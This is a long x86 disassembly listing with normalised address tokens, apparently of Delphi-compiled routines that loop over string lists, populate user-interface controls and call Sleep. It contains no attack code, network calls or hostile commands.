mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x9
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3af6b68
mov [ ebp - 0x1c8 ] eax
mov eax [ ebp - 0x1c8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xa
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x1c4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
push 0x0
push 0x1
push 0x0
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
call sub_3ae3058
xor edx edx
push edx
push eax
lea eax [ ebp - 0x1f8 ]
call sub_3a69958
mov ecx [ ebp - 0x1f8 ]
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
xor edx edx
call sub_3adeaa4
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x1b4 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x360 ]
mov edx [ eax ]
call [ edx + 0xe8 ]
mov eax [ ebp - 0x1c4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x1c0 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x8
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x1b4 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x38c ]
mov edx [ ebp - 0x8 ]
call sub_3aafbb8
mov eax [ ebp - 0x1c4 ]
call sub_3a64380
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
mov edx r-xdata
call sub_3ae35c4
inc esi
mov [ ebp - 0x1c0 ] 0x0
push 0x0
push 0x1
push 0x0
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
call sub_3ae3058
xor edx edx
push edx
push eax
lea eax [ ebp - 0x1f0 ]
call sub_3a69958
mov ecx [ ebp - 0x1f0 ]
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
xor edx edx
call sub_3adeaa4
mov [ ebp - 0x1b4 ] eax
lea ecx [ ebp - 0x1f4 ]
mov edx [ ebp - 0x1c0 ]
mov eax [ ebp - 0x1c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1f4 ]
push eax
mov eax [ ebp - 0x1b4 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x390 ]
mov eax [ eax + 0x284 ]
pop edx
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebp - 0x1c0 ]
dec esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x9
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x1c4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
push 0x0
push 0x1
push 0x0
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
call sub_3ae3058
xor edx edx
push edx
push eax
lea eax [ ebp - 0x200 ]
call sub_3a69958
mov ecx [ ebp - 0x200 ]
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
xor edx edx
call sub_3adeaa4
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x1b4 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x360 ]
mov edx [ eax ]
call [ edx + 0xe8 ]
mov eax [ ebp - 0x1c4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x1b4 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x278 ]
call sub_3adab2c
mov ebx eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_3ada76c
push 0xa
call Sleep
lea ecx [ ebp - 0x1fc ]
mov edx [ ebp - 0x1c0 ]
mov eax [ ebp - 0x1c4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x1fc ]
mov eax ebx
call sub_3ada5a8
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebp - 0x1c0 ]
dec esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x8
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x1c4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp - 0x1c4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x1c4 ]
call sub_3a64380
push r-xdata
mov eax [ ebp - 0x1b4 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x38c ]
lea edx [ ebp - 0x20c ]
call sub_3aafb88
push [ ebp - 0x20c ]
push r-xdata
lea eax [ ebp - 0x208 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x208 ]
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
call sub_3ae35c4
inc esi
mov [ ebp - 0x1c0 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xd
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x1b4 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x37c ]
push eax
mov eax [ ebp - 0x8 ]
call sub_3a699d8
mov edx eax
pop eax
call sub_3ad96ac
mov eax [ ebp - 0x1c4 ]
call sub_3a64380
inc esi
mov [ ebp - 0x1c0 ] 0x0
mov eax [ ebp - 0x1b4 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x278 ]
call sub_3adab2c
mov ebx eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_3ada76c
push 0xa
call Sleep
lea ecx [ ebp - 0x204 ]
mov edx [ ebp - 0x1c0 ]
mov eax [ ebp - 0x1c4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x204 ]
mov eax ebx
call sub_3ada5a8
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebp - 0x1c0 ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1b4 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x37c ]
xor edx edx
call sub_3ad96ac
push r-xdata
mov eax [ ebp - 0x1b4 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x38c ]
lea edx [ ebp - 0x21c ]
call sub_3aafb88
push [ ebp - 0x21c ]
push r-xdata
lea eax [ ebp - 0x218 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x218 ]
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
call sub_3ae35c4
push 0x40
mov ecx r-xdata
mov edx r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3acf71c
push 0x0
push 0x1
push 0x0
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
call sub_3ae3058
xor edx edx
push edx
push eax
lea eax [ ebp - 0x210 ]
call sub_3a69958
mov ecx [ ebp - 0x210 ]
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
xor edx edx
call sub_3adeaa4
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x1b4 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x278 ]
call sub_3adab2c
mov ebx eax
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_3ada76c
lea ecx [ ebp - 0x214 ]
mov edx [ ebp - 0x1c0 ]
mov eax [ ebp - 0x1c4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x214 ]
lea edx [ ebp - 0x1ac ]
mov ecx 0x64
call sub_3af726c
push 0xa
call Sleep
mov edx [ ebp - 0x1ac ]
mov eax ebx
call sub_3ada5a8
mov edx [ ebp - 0x1a8 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ ebp - 0x1a4 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ ebp - 0x1a0 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ ebp - 0x19c ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebp - 0x1c0 ]
dec esi
jne r-xdata
sub_3af858e
mov eax [ ebp - 0x10 ]
call sub_3a64380
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af85e0
lea eax [ ebp - 0x1c ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
call sub_3ae3ae0
test eax eax
jle r-xdata
push 0xa
call Sleep
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x44 ]
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
xor edx edx
call sub_3adeaa4
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
call sub_3ae3aec
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
xor eax eax
push ebp
push j_sub_3a648a0#3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call j_sub_3a65744#2
mov esi eax
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x378 ]
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov edx eax
pop eax
call sub_3ad96ac
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x1c ]
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_3a65798
mov eax [ ebp - 0x1c ]
call sub_3a699d8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x378 ]
mov edx [ ebp - 0xc ]
call sub_3ad969c
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x11 ] 0x1
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_3a657d8
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_3a7cbbc
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
call sub_3af696c
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov edx [ eax + 0x3ec ]
mov eax [ ebp - 0x10 ]
call sub_3a7d31c
mov eax [ ebp - 0x10 ]
call sub_3a64380
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x378 ]
xor edx edx
call sub_3ad96ac
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x3e0 ]
mov edx r-xdata
call sub_3aafbb8
mov eax [ ebp - 0x8 ]
call sub_3a835b8
sub_3af8604
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push j_sub_3a64b54#7
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af889e
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
call sub_3ae3ae0
test eax eax
jle r-xdata
push 0xa
call Sleep
push 0x0
push 0x1
push 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x44 ]
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
xor edx edx
call sub_3adeaa4
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
call sub_3ae3aec
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
xor eax eax
push ebp
push j_sub_3a648a0#2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call j_sub_3a65744#2
mov esi eax
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x378 ]
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov edx eax
pop eax
call sub_3ad96ac
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x20 ]
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_3a65798
mov eax [ ebp - 0x20 ]
call sub_3a699d8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x378 ]
mov edx [ ebp - 0xc ]
call sub_3ad969c
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x11 ] 0x1
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_3a657d8
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_3a7cbbc
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
call sub_3af696c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x10 ]
call sub_3a64380
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
pop edx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x378 ]
xor edx edx
call sub_3ad96ac
mov eax [ ebp - 0x8 ]
call sub_3a835b8
sub_3af8847
mov eax [ ebp - 0x10 ]
call sub_3a64380
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af889e
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
call sub_3ae3ae0
test eax eax
jle r-xdata
push 0xa
call Sleep
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x44 ]
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
xor edx edx
call sub_3adeaa4
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
call sub_3ae3aec
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
xor eax eax
push ebp
push j_sub_3a648a0#2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call j_sub_3a65744#2
mov esi eax
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x378 ]
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov edx eax
pop eax
call sub_3ad96ac
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x20 ]
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_3a65798
mov eax [ ebp - 0x20 ]
call sub_3a699d8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x378 ]
mov edx [ ebp - 0xc ]
call sub_3ad969c
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x11 ] 0x1
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_3a657d8
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_3a7cbbc
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
call sub_3af696c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x10 ]
call sub_3a64380
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
pop edx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x378 ]
xor edx edx
call sub_3ad96ac
mov eax [ ebp - 0x8 ]
call sub_3a835b8
sub_3af88ab
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push j_sub_3a64b54#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x370 ]
mov edx [ eax ]
call [ edx + 0xdc ]
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af8afb
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_3a652c4
retn
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ac5bc8
mov esi eax
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov ecx esi
mov edx 0x2
mov edi [ eax ]
call [ edi + 0x24 ]
push r-xdata
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x8 ]
xor edx edx
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_3aafbb8
mov eax esi
call sub_3acb6ac
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov [ esi + 0x384 ] edi
mov edx r-xdata
mov eax edi
call sub_3ae35c4
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x10 ]
xor edx edx
